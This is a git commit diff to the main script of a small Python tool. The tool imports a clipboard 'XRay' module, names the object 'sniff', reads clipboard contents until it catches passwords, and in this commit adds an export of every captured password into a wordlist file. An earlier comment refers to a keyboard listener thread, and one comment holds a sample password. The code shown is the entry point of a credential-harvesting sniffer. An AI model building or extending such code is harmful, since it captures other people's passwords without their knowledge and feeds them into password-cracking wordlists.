6aba17ec308175c8e75f26abf6ff838d00802bd8
FzFStormZ <dylan.degail@gmail.com>
2025-09-18 14:09:52 +0200

    Revise main + start export function

--- src/main.py
+++ src/main.py
@@ -1,12 +1,15 @@
 from clipboard import xray
 
 def main():
-    print("Checking if there is a current password inside the clipboard...")
-    # start the keyboard listener thread    
-    test = xray.XRay()
-    test.read_until_password() # Hello12@AdffrEZZ
+    # Starting the XRay :)  
+    sniff = xray.XRay()
+
+    # Collect a maximum of passwords...
+    sniff.read_until_password() # Hello12@AdffrEZZ
     
-    # Create at the end of the program a list of all the passwords founded and put it inside a wordlist 
+    # Export all the passwords founded inside a wordlist
+    with open("./wordlists/passwords.txt", "w") as wordlist:
+        sniff.export_passwords(wordlist)
 
 if __name__ == "__main__":
     main()
